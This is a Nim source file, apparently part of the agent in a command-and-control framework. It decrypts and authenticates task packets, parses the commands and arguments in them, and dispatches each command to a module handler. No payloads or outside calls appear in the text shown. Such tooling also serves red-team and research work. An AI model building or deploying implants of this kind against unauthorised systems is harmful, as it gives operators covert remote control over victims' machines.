import strutils, tables, json, strformat, sugar

import ../../modules/manager
import ../../common/[types, serialize, sequence, crypto, utils]

proc handleTask*(config: AgentConfig, task: Task): TaskResult = 
    try: 
        return getCommandByType(cast[CommandType](task.command)).execute(config, task)
    except CatchableError: 
        echo "[-] Command not found."

proc deserializeTask*(config: AgentConfig, bytes: seq[byte]): Task = 

    var unpacker = initUnpacker(bytes.toString)

    let header = unpacker.unpackHeader()

    # Packet Validation
    if header.magic != MAGIC: 
        raise newException(CatchableError, "Invalid magic bytes.")

    if header.packetType != cast[uint8](MSG_TASK): 
        raise newException(CatchableError, "Invalid packet type.")

    # Validate sequence number
    if not validateSequence(header.agentId, header.seqNr, header.packetType): 
        raise newException(CatchableError, "Invalid sequence number.")

    # Decrypt payload 
    let payload = unpacker.getBytes(int(header.size))

    let (decData, gmac) = decrypt(config.sessionKey, header.iv, payload, header.seqNr)

    if gmac != header.gmac:
        raise newException(CatchableError, "Invalid authentication tag (GMAC) for task.")

    # Deserialize decrypted data
    unpacker = initUnpacker(decData.toString)

    let 
        taskId = unpacker.getUint32()
        listenerId = unpacker.getUint32()
        timestamp = unpacker.getUint32()
        command = unpacker.getUint16()
    
    var argCount = unpacker.getUint8()
    var args = newSeq[TaskArg]() 

    # Parse arguments
    var i = 0
    while i < int(argCount): 
        args.add(unpacker.getArgument())
        inc i

    return Task(
        header: header,
        taskId: taskId,
        listenerId: listenerId, 
        timestamp: timestamp,
        command: command,
        argCount: argCount,
        args: args
    )

proc deserializePacket*(config: AgentConfig, packet: string): seq[Task] = 

    result = newSeq[Task]()

    var unpacker = initUnpacker(packet) 

    var taskCount = unpacker.getUint8()
    echo fmt"[*] Response contained {taskCount} tasks."
    if taskCount <= 0: 
        return @[]

    while taskCount > 0: 

        # Read length of each task and store the task object in a seq[byte]
        let 
            taskLength = unpacker.getUint32() 
            taskBytes = unpacker.getBytes(int(taskLength))

        result.add(config.deserializeTask(taskBytes))
        
        dec taskCount